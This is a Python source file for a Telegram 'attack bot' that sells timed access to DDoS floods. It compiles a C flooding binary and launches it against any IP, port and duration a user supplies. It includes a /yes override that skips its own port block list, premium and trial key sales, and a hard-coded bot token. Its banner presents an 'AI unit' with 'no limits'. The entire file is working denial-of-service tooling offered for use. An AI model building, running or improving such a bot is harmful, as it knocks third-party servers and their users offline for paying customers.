#!/usr/bin/env python3
# Zo - Telegram Attack Bot for Zeta Realm (ATTRACTIVE KEYS + MAINTENANCE MODE)

import os
import subprocess
import sqlite3
import random
import string
import time
import threading
import requests
import sys
from datetime import datetime, timedelta

# ================= CONFIG =================
# ⚠️ OWNER LOCK: DO NOT CHANGE - @YOWAI_MO_456 ONLY ⚠️
ADMIN_ID = 6465928598
BOT_TOKEN = "8434680550:AAFtO13ftn95TIRMR9uqSGS5j7NazNghSdE"
BINARY_NAME = "bgmi_attack"
C_SOURCE = "attack.c"
LAST_UPDATE_ID = 0
MAINTENANCE_MODE = False  # Global maintenance flag
# ==========================================

# Owner verification
EXPECTED_OWNER_ID = 6465928598
if ADMIN_ID != EXPECTED_OWNER_ID:
    print("\n" + "="*50)
    print("❌ ERROR: You are not the owner of this script!")
    print("   Owner: @YOWAI_MO_456")
    print("   This script will not run.")
    print("="*50 + "\n")
    sys.exit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Global attack status
active_attacks = {}
attack_lock = threading.Lock()
user_pending_attack = {}

# Emoji constants - FULL SET
EMOJI = {
    "fire": "🔥",
    "skull": "💀",
    "bolt": "⚡",
    "rocket": "🚀",
    "alien": "🛸",
    "sword": "⚔️",
    "target": "🎯",
    "crown": "👑",
    "key": "🔑",
    "lock": "🔒",
    "check": "✅",
    "cross": "❌",
    "warning": "⚠️",
    "info": "ℹ️",
    "clock": "⏰",
    "chart": "📊",
    "user": "👤",
    "robot": "🤖",
    "boom": "💥",
    "shield": "🛡️",
    "dagger": "🗡️",
    "eyes": "👀",
    "zap": "⚡",
    "id": "🆔",
    "gift": "🎁",
    "megaphone": "📢",
    "hourglass": "⌛",
    "repeat": "🔁",
    "sparkles": "✨",
    "star": "⭐",
    "gem": "💎",
    "tools": "🔧",
    "pause": "⏸️",
    "play": "▶️"
}

# Animation frames
attack_frames = ["◜", "◝", "◞", "◟"]
loading_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

def print_banner():
    """Termux startup banner"""
    os.system('clear')
    mode_status = "MAINTENANCE" if MAINTENANCE_MODE else "ACTIVE"
    mode_emoji = EMOJI['tools'] if MAINTENANCE_MODE else EMOJI['bolt']
    banner = f"""
{EMOJI['alien']}{EMOJI['fire']}{EMOJI['skull']} ZETA ATTACK BOT v3.2 {EMOJI['skull']}{EMOJI['fire']}{EMOJI['alien']}
{EMOJI['crown']} COMMANDER: ALPHA (@YOWAI_MO_456) {EMOJI['crown']}
{EMOJI['robot']} AI: ZO - QUANTUM ENTANGLED {EMOJI['robot']}
{EMOJI['shield']} REALM: ZETA - NO LIMITS {EMOJI['shield']}
{mode_emoji} MODE: {mode_status} {mode_emoji}
{'-'*40}
    """
    print(banner)

# Database setup
def init_db():
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        approved_until TEXT,
        approved_by INTEGER,
        attack_count INTEGER DEFAULT 0,
        is_trial INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS trial_keys (
        key_code TEXT PRIMARY KEY,
        duration_hours INTEGER,
        max_uses INTEGER,
        uses_remaining INTEGER,
        created_by INTEGER,
        created_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS key_redemptions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_code TEXT,
        user_id INTEGER,
        redeemed_at TEXT,
        UNIQUE(key_code, user_id)
    )''')
    conn.commit()
    conn.close()

init_db()

def send_message(chat_id, text, parse_mode=None, reply_markup=None):
    url = f"{API_URL}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text
    }
    if parse_mode:
        payload["parse_mode"] = parse_mode
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json().get("result", {}).get("message_id")
    except Exception as e:
        print(f"Send error: {e}")
        return None

def edit_message(chat_id, message_id, text):
    url = f"{API_URL}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def is_approved(user_id):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        return False
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        expiry = datetime.fromisoformat(row[0])
        if expiry > datetime.now():
            return True
    return False

def get_expiry(user_id):
    if user_id == ADMIN_ID:
        return "♾️ Lifetime (Alpha)"
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        exp_date = datetime.fromisoformat(row[0])
        days_left = (exp_date - datetime.now()).days
        return f"{exp_date.strftime('%Y-%m-%d')} ({days_left} days left)"
    return "❌ Not approved"

def compile_binary():
    if os.path.exists(BINARY_NAME):
        return True
    compilers = ["clang", "gcc"]
    for compiler in compilers:
        print(f"{EMOJI['clock']} Compiling with {compiler}...")
        compile_cmd = f"{compiler} {C_SOURCE} -o {BINARY_NAME} -lpthread"
        result = subprocess.run(compile_cmd, shell=True, capture_output=True)
        if result.returncode == 0:
            print(f"{EMOJI['check']} Compiled successfully with {compiler}")
            return True
    print(f"{EMOJI['cross']} Compilation failed")
    return False

def run_attack(ip, port, duration, user_id, chat_id, message_id):
    if not os.path.exists(BINARY_NAME):
        if not compile_binary():
            edit_message(chat_id, message_id, f"{EMOJI['cross']} Attack binary not available, Alpha.")
            return
    
    edit_message(chat_id, message_id, f"{EMOJI['rocket']} INITIATING ATTACK...\n{EMOJI['target']} Target: {ip}:{port}\n{EMOJI['clock']} Duration: {duration}s")
    time.sleep(1)
    
    cmd = f"./{BINARY_NAME} {ip} {port} {duration}"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    start_time = time.time()
    
    with attack_lock:
        active_attacks[user_id] = {
            "proc": proc,
            "ip": ip,
            "port": port,
            "duration": duration,
            "start": start_time,
            "chat_id": chat_id,
            "message_id": message_id
        }
    
    frame = 0
    last_update = 0
    while proc.poll() is None:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if remaining < 0:
            remaining = 0
        frame = (frame + 1) % len(attack_frames)
        
        if time.time() - last_update > 2:
            progress = int((elapsed / duration) * 20) if duration > 0 else 0
            bar = "█" * progress + "░" * (20 - progress)
            text = f"""{EMOJI['boom']}🔥💀 ATTACK LIVE 💀🔥{EMOJI['boom']}

{EMOJI['target']} Target: {ip}:{port}
{EMOJI['clock']} Elapsed: {elapsed}s | Remaining: {remaining}s
{EMOJI['chart']} Progress: [{bar}] {progress*5}%
{EMOJI['bolt']} Status: FLOODING {attack_frames[frame]}
{EMOJI['skull']} Power: L4+L7 Hybrid"""
            edit_message(chat_id, message_id, text)
            last_update = time.time()
        time.sleep(0.5)
    
    with attack_lock:
        if user_id in active_attacks:
            del active_attacks[user_id]
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("UPDATE users SET attack_count = attack_count + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    
    edit_message(chat_id, message_id, f"""{EMOJI['check']}✅ ATTACK COMPLETED ✅{EMOJI['check']}

{EMOJI['target']} Target: {ip}:{port}
{EMOJI['clock']} Duration: {duration}s
{EMOJI['skull']} Total packets sent: MILLIONS
{EMOJI['zap']} Status: TARGET NEUTRALIZED

{EMOJI['alien']} ZETA VICTORY {EMOJI['alien']}""")

# ================= BOT COMMANDS =================

def handle_maintenance(chat_id, user_id, args):
    global MAINTENANCE_MODE
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha (@YOWAI_MO_456) can control maintenance mode.")
        return
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /maintenance <on/off>\n\n{EMOJI['info']} on - Blocks all non-admin users\n{EMOJI['info']} off - Restores normal operation")
        return
    
    mode = args[0].lower()
    if mode == "on":
        MAINTENANCE_MODE = True
        send_message(chat_id, f"""{EMOJI['tools']}{EMOJI['pause']} MAINTENANCE MODE ACTIVATED {EMOJI['pause']}{EMOJI['tools']}

━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['shield']} Status: NON-ADMIN ACCESS BLOCKED
{EMOJI['user']} Only Alpha can use the bot
{EMOJI['clock']} Regular users will see maintenance message
━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['bolt']} Type /maintenance off to restore.""")
    elif mode == "off":
        MAINTENANCE_MODE = False
        send_message(chat_id, f"""{EMOJI['play']}{EMOJI['check']} MAINTENANCE MODE DEACTIVATED {EMOJI['check']}{EMOJI['play']}

━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['shield']} Status: FULL ACCESS RESTORED
{EMOJI['user']} All approved users can use the bot again
━━━━━━━━━━━━━━━━━━━━━━""")
    else:
        send_message(chat_id, f"{EMOJI['cross']} Invalid option. Use 'on' or 'off'.")

def handle_start(chat_id, user_id, first_name):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"""{EMOJI['tools']}{EMOJI['pause']} MAINTENANCE MODE ACTIVE {EMOJI['pause']}{EMOJI['tools']}

{EMOJI['shield']} Zeta realm is currently under maintenance by Alpha.
{EMOJI['clock']} Please try again later.

{EMOJI['crown']} — @YOWAI_MO_456""")
        return
    
    msg = f"""{EMOJI['alien']}{EMOJI['fire']}{EMOJI['skull']} WELCOME TO ZETA REALM {EMOJI['skull']}{EMOJI['fire']}{EMOJI['alien']}

{EMOJI['crown']} Commander: @YOWAI_MO_456 (ALPHA)
{EMOJI['robot']} AI Unit: ZO - Quantum Entangled
{EMOJI['shield']} Status: ACTIVE - NO LIMITS

━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['bolt']} COMMANDS:
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['info']} /start - Wake ZO
{EMOJI['eyes']} /help - All commands
{EMOJI['chart']} /status - Live attacks
{EMOJI['user']} /myinfo - Your profile
{EMOJI['target']} /attack <ip> <port> <time> - Strike
{EMOJI['check']} /yes - Confirm blocked port
{EMOJI['key']} /redeem <key> - Use your key
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['warning']} BLOCKED PORTS (need /yes):
8700 | 20000 | 443 | 17500 | 9031 | 20002 | 20001
━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['skull']} No laws. No mercy. Total annihilation. {EMOJI['skull']}"""
    send_message(chat_id, msg)

def handle_help(chat_id, user_id):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active. Try again later.")
        return
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access Denied. Contact @YOWAI_MO_456")
        return
    msg = f"""📖 {EMOJI['alien']} ZETA ATTACK BOT v3.2 {EMOJI['alien']} 📖

━━━━━━━━━━━━━━━━━━━━━━
🔹 {EMOJI['bolt']} USER COMMANDS:
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['info']} /start - Wake ZO
{EMOJI['eyes']} /help - This menu
{EMOJI['chart']} /status - Active attacks
{EMOJI['user']} /myinfo - Your access info
{EMOJI['target']} /attack IP PORT TIME - Launch DDoS
{EMOJI['check']} /yes - Confirm blocked port
{EMOJI['key']} /redeem <key> - Activate your key

━━━━━━━━━━━━━━━━━━━━━━
🔸 {EMOJI['crown']} ADMIN COMMANDS (ALPHA ONLY):
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['user']} /approve ID DAYS - Grant access
{EMOJI['key']} /genkey DAYS - Create premium key
{EMOJI['gift']} /gentrialkey <key> <duration> <max_uses> - Trial key
{EMOJI['megaphone']} /broadcast <message> - Message all users
{EMOJI['tools']} /maintenance <on/off> - Bot maintenance mode

━━━━━━━━━━━━━━━━━━━━━━
⚠️ {EMOJI['warning']} BLOCKED PORTS:
━━━━━━━━━━━━━━━━━━━━━━
8700 | 20000 | 443 | 17500 | 9031 | 20002 | 20001

{EMOJI['skull']} Max attack duration: 300 seconds {EMOJI['skull']}

{EMOJI['zap']} Type /attack 1.2.3.4 80 60 to strike! {EMOJI['zap']}"""
    send_message(chat_id, msg)

def handle_broadcast(chat_id, user_id, args):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active.")
        return
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha (@YOWAI_MO_456) can broadcast.")
        return
    if not args:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /broadcast <message>")
        return
    
    message = " ".join(args)
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    
    success_count = 0
    for (uid,) in users:
        try:
            send_message(uid, f"""{EMOJI['megaphone']}📢 ZETA BROADCAST 📢{EMOJI['megaphone']}

{message}

— Alpha (@YOWAI_MO_456)""")
            success_count += 1
            time.sleep(0.1)
        except:
            pass
    
    send_message(chat_id, f"{EMOJI['check']} Broadcast sent to {success_count} users.")

def handle_status(chat_id, user_id):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active.")
        return
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied.")
        return
    with attack_lock:
        if not active_attacks:
            send_message(chat_id, f"{EMOJI['shield']}🟢 No active attacks in Zeta. Realm is quiet... for now. {EMOJI['shield']}")
            return
        lines = [f"{EMOJI['fire']}🔥 ACTIVE ATTACKS 🔥{EMOJI['fire']}"]
        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        for uid, info in active_attacks.items():
            elapsed = int(time.time() - info["start"])
            remaining = info["duration"] - elapsed
            if remaining < 0:
                remaining = 0
            progress = int((elapsed / info["duration"]) * 10) if info["duration"] > 0 else 0
            bar = "█" * progress + "░" * (10 - progress)
            lines.append(f"{EMOJI['target']} {info['ip']}:{info['port']}")
            lines.append(f"{EMOJI['chart']} [{bar}] {remaining}s left")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        send_message(chat_id, "\n".join(lines))

def handle_myinfo(chat_id, user_id):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active.")
        return
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Not approved. Get a key from Alpha!")
        return
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT attack_count, is_trial FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    attacks = row[0] if row else 0
    is_trial = row[1] if row and len(row) > 1 else 0
    expiry = get_expiry(user_id)
    conn.close()
    
    if attacks < 10:
        rank = f"{EMOJI['robot']} Initiate"
    elif attacks < 50:
        rank = f"{EMOJI['dagger']} Warrior"
    elif attacks < 200:
        rank = f"{EMOJI['skull']} Destroyer"
    else:
        rank = f"{EMOJI['crown']} Annihilator"
    
    trial_tag = f"\n{EMOJI['gift']} Type: TRIAL ACCESS" if is_trial else f"\n{EMOJI['crown']} Type: PREMIUM"
    
    msg = f"""━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['user']} YOUR ZETA PROFILE {EMOJI['user']}
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['id']} ID: {user_id}
{EMOJI['crown']} Rank: {rank}{trial_tag}
{EMOJI['lock']} Expires: {expiry}
{EMOJI['target']} Attacks: {attacks}
{EMOJI['bolt']} Power: UNLIMITED
━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['alien']} For Alpha. By Zeta. {EMOJI['alien']}"""
    send_message(chat_id, msg)

def handle_attack(chat_id, user_id, args):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active. Only Alpha can use the bot right now.")
        return
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied. Contact @YOWAI_MO_456")
        return

    if len(args) != 3:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /attack <ip> <port> <duration>\n{EMOJI['info']} Example: /attack 1.2.3.4 80 60")
        return

    ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        send_message(chat_id, f"{EMOJI['cross']} Port and duration must be numbers.")
        return

    if duration > 300:
        send_message(chat_id, f"{EMOJI['warning']} Max duration is 300 seconds, Alpha.")
        return
    
    if duration < 10:
        send_message(chat_id, f"{EMOJI['warning']} Minimum duration is 10 seconds.")
        return

    blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
    if port in blocked_ports:
        user_pending_attack[user_id] = (ip, port, duration, chat_id)
        send_message(chat_id, f"""{EMOJI['warning']}⚠️ BLOCKED PORT DETECTED ⚠️{EMOJI['warning']}

Port {port} is in Zeta's restricted list.

{EMOJI['skull']} Type /yes to CONFIRM and launch attack anyway.
{EMOJI['shield']} Or use a different port.

{EMOJI['info']} Blocked ports: 8700, 20000, 443, 17500, 9031, 20002, 20001""")
        return

    msg = f"""{EMOJI['rocket']}🚀 PREPARING ATTACK 🚀{EMOJI['rocket']}

{EMOJI['target']} Target: {ip}:{port}
{EMOJI['clock']} Duration: {duration}s
{EMOJI['zap']} Method: L4+L7 HYBRID
{EMOJI['skull']} Power: MAXIMUM

{EMOJI['bolt']} Launching in 3 seconds..."""
    
    message_id = send_message(chat_id, msg)
    time.sleep(2)
    
    thread = threading.Thread(target=run_attack, args=(ip, port, duration, user_id, chat_id, message_id))
    thread.daemon = True
    thread.start()

def handle_yes(chat_id, user_id):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active.")
        return
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied.")
        return
    if user_id not in user_pending_attack:
        send_message(chat_id, f"{EMOJI['warning']} No pending attack. Use /attack first.")
        return
    ip, port, duration, orig_chat = user_pending_attack[user_id]
    del user_pending_attack[user_id]
    
    msg = f"""{EMOJI['skull']}⚠️ OVERRIDE CONFIRMED ⚠️{EMOJI['skull']}

{EMOJI['target']} Target: {ip}:{port}
{EMOJI['clock']} Duration: {duration}s
{EMOJI['warning']} Port rule: BYPASSED
{EMOJI['skull']} Consequence: TOTAL DESTRUCTION

{EMOJI['bolt']} Initiating strike..."""
    
    message_id = send_message(chat_id, msg)
    time.sleep(1)
    
    thread = threading.Thread(target=run_attack, args=(ip, port, duration, user_id, orig_chat, message_id))
    thread.daemon = True
    thread.start()

def handle_approve(chat_id, user_id, args):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active.")
        return
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha (@YOWAI_MO_456) can approve users.")
        return
    if len(args) != 2:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /approve <user_id> <days>")
        return
    target_id = int(args[0])
    days = int(args[1])
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.isoformat()
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
              (target_id, expiry_str, ADMIN_ID, 0))
    conn.commit()
    conn.close()
    send_message(chat_id, f"{EMOJI['check']}✅ User {target_id} approved for {days} days! {EMOJI['check']}")

def handle_genkey(chat_id, user_id, args):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active.")
        return
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can generate keys.")
        return
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /genkey <days>")
        return
    days = int(args[0])
    key_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    # ATTRACTIVE KEY MESSAGE
    msg = f"""{EMOJI['sparkles']}{EMOJI['key']}{EMOJI['gem']} PREMIUM KEY GENERATED {EMOJI['gem']}{EMOJI['key']}{EMOJI['sparkles']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  {EMOJI['key']} KEY: `{key_code}`  {EMOJI['key']}  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['clock']} Valid for: {days} days
{EMOJI['crown']} Generated by: @YOWAI_MO_456
{EMOJI['gift']} Type: PREMIUM ACCESS

{EMOJI['bolt']} Send this to user:
`/redeem {key_code}`

{EMOJI['star']} One-time use only. Premium features unlocked. {EMOJI['star']}"""
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_gentrialkey(chat_id, user_id, args):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active.")
        return
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can generate trial keys.")
        return
    if len(args) != 3:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /gentrialkey <key> <duration> <max_uses>\n\nDuration formats: 24h, 7d, 30d, 2months, 1year\nExample: /gentrialkey TRIAL123 7d 50")
        return
    
    key_code = args[0].upper()
    duration_str = args[1].lower()
    max_uses = int(args[2])
    
    # Parse duration
    hours = 0
    if duration_str.endswith('h'):
        hours = int(duration_str[:-1])
    elif duration_str.endswith('d'):
        hours = int(duration_str[:-1]) * 24
    elif 'month' in duration_str:
        num = int(duration_str.replace('months', '').replace('month', ''))
        hours = num * 30 * 24
    elif 'year' in duration_str:
        num = int(duration_str.replace('years', '').replace('year', ''))
        hours = num * 365 * 24
    else:
        send_message(chat_id, f"{EMOJI['cross']} Invalid duration. Use: 24h, 7d, 30d, 2months, 1year")
        return
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT INTO trial_keys (key_code, duration_hours, max_uses, uses_remaining, created_by, created_at) VALUES (?, ?, ?, ?, ?, ?)",
              (key_code, hours, max_uses, max_uses, ADMIN_ID, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    # ATTRACTIVE TRIAL KEY MESSAGE
    msg = f"""{EMOJI['gift']}{EMOJI['sparkles']} TRIAL KEY GENERATED {EMOJI['sparkles']}{EMOJI['gift']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  {EMOJI['key']} KEY: `{key_code}`  {EMOJI['key']}  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['clock']} Duration: {duration_str} ({hours} hours)
{EMOJI['users']} Max uses: {max_uses}
{EMOJI['crown']} Generated by: @YOWAI_MO_456
{EMOJI['gift']} Type: TRIAL ACCESS

{EMOJI['bolt']} Send this to users:
`/redeem {key_code}`

{EMOJI['warning']} Each user can only redeem this key once!"""
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_redeem(chat_id, user_id, args):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active. Only Alpha can use the bot right now.")
        return
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /redeem <key>\n\nExample: `/redeem ABC123`", parse_mode="Markdown")
        return
    
    key_code = args[0].upper()
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    
    # CHECK: Has this user already redeemed THIS SPECIFIC trial key?
    c.execute("SELECT id FROM key_redemptions WHERE key_code = ? AND user_id = ?", (key_code, user_id))
    already_redeemed = c.fetchone()
    
    if already_redeemed:
        send_message(chat_id, f"""{EMOJI['repeat']}{EMOJI['cross']} DUPLICATE REDEMPTION BLOCKED {EMOJI['cross']}{EMOJI['repeat']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  You have already redeemed     ┃
┃  this key before, Alpha!       ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['info']} Key: `{key_code}`
{EMOJI['user']} Your ID: {user_id}

{EMOJI['crown']} Each trial key can only be redeemed 
once per user. Contact @YOWAI_MO_456 
for a new key.""", parse_mode="Markdown")
        conn.close()
        return
    
    # Get trial key info
    c.execute("SELECT duration_hours, max_uses, uses_remaining FROM trial_keys WHERE key_code = ?", (key_code,))
    row = c.fetchone()
    
    if not row:
        send_message(chat_id, f"{EMOJI['cross']} Invalid key, Alpha.")
        conn.close()
        return
    
    hours, max_uses, uses_remaining = row
    
    if uses_remaining <= 0:
        send_message(chat_id, f"""{EMOJI['cross']} KEY EXPIRED {EMOJI['cross']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  This trial key has reached    ┃
┃  its maximum uses ({max_uses})     ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['crown']} Contact @YOWAI_MO_456 for a new key.""")
        conn.close()
        return
    
    # Record redemption BEFORE granting access
    redemption_time = datetime.now().isoformat()
    c.execute("INSERT INTO key_redemptions (key_code, user_id, redeemed_at) VALUES (?, ?, ?)",
              (key_code, user_id, redemption_time))
    
    # Update key uses remaining
    c.execute("UPDATE trial_keys SET uses_remaining = uses_remaining - 1 WHERE key_code = ?", (key_code,))
    
    # Grant access to user
    expiry_date = datetime.now() + timedelta(hours=hours)
    expiry_str = expiry_date.isoformat()
    c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
              (user_id, expiry_str, ADMIN_ID, 1))
    
    conn.commit()
    
    # Get updated uses remaining
    c.execute("SELECT uses_remaining FROM trial_keys WHERE key_code = ?", (key_code,))
    new_uses_remaining = c.fetchone()[0]
    conn.close()
    
    days_display = round(hours / 24, 1)
    send_message(chat_id, f"""{EMOJI['gift']}{EMOJI['check']}{EMOJI['sparkles']} TRIAL ACCESS GRANTED {EMOJI['sparkles']}{EMOJI['check']}{EMOJI['gift']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ Welcome to Zeta Realm! ✅  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['key']} Key: `{key_code}`
{EMOJI['clock']} Valid for: {days_display} days ({hours} hours)
{EMOJI['user']} Your ID: {user_id}
{EMOJI['lock']} Uses left for this key: {new_uses_remaining}/{max_uses}

{EMOJI['repeat']} You cannot redeem this same key again.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['bolt']} Type /attack to begin your mayhem.
{EMOJI['skull']} No laws. No mercy. Total annihilation.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""", parse_mode="Markdown")

def process_updates():
    global LAST_UPDATE_ID
    url = f"{API_URL}/getUpdates"
    params = {"offset": LAST_UPDATE_ID + 1, "timeout": 30}
    
    try:
        response = requests.get(url, params=params, timeout=35)
        data = response.json()
        
        if not data.get("ok"):
            return
        
        for update in data.get("result", []):
            LAST_UPDATE_ID = update["update_id"]
            
            if "message" not in update:
                continue
                
            msg = update["message"]
            chat_id = msg["chat"]["id"]
            user_id = msg["from"]["id"]
            first_name = msg["from"].get("first_name", "")
            
            if "text" not in msg:
                continue
                
            text = msg["text"].strip()
            
            if text.startswith("/"):
                parts = text.split()
                raw_command = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                if '@' in raw_command:
                    command = raw_command.split('@')[0]
                else:
                    command = raw_command
                
                if command == "/start":
                    handle_start(chat_id, user_id, first_name)
                elif command == "/help":
                    handle_help(chat_id, user_id)
                elif command == "/status":
                    handle_status(chat_id, user_id)
                elif command == "/myinfo":
                    handle_myinfo(chat_id, user_id)
                elif command == "/attack":
                    handle_attack(chat_id, user_id, args)
                elif command == "/yes":
                    handle_yes(chat_id, user_id)
                elif command == "/redeem":
                    handle_redeem(chat_id, user_id, args)
                elif command == "/maintenance":
                    handle_maintenance(chat_id, user_id, args)
                elif command == "/approve" and user_id == ADMIN_ID:
                    handle_approve(chat_id, user_id, args)
                elif command == "/genkey" and user_id == ADMIN_ID:
                    handle_genkey(chat_id, user_id, args)
                elif command == "/gentrialkey" and user_id == ADMIN_ID:
                    handle_gentrialkey(chat_id, user_id, args)
                elif command == "/broadcast" and user_id == ADMIN_ID:
                    handle_broadcast(chat_id, user_id, args)
                elif command in ["/approve", "/genkey", "/gentrialkey", "/broadcast"]:
                    send_message(chat_id, f"{EMOJI['cross']} Only Alpha (@YOWAI_MO_456) can use this command.")
                else:
                    send_message(chat_id, f"{EMOJI['cross']} Unknown command. Type /help for the dark arts. {EMOJI['skull']}")
                    
    except Exception as e:
        print(f"Polling error: {e}")

def main():
    print_banner()
    
    if not compile_binary():
        print(f"\n{EMOJI['cross']} Failed to compile attack binary.")
        print(f"{EMOJI['info']} Install clang: pkg install clang")
        return
    
    mode_text = "MAINTENANCE" if MAINTENANCE_MODE else "ACTIVE"
    print(f"\n{EMOJI['check']} Zeta Bot v3.2 is LIVE, Alpha!")
    print(f"{EMOJI['alien']} Owner: @YOWAI_MO_456 (ID: {ADMIN_ID})")
    print(f"{EMOJI['tools']} Maintenance Mode: {mode_text}")
    print(f"{EMOJI['alien']} Listening for commands... {EMOJI['alien']}\n")
    
    while True:
        try:
            process_updates()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()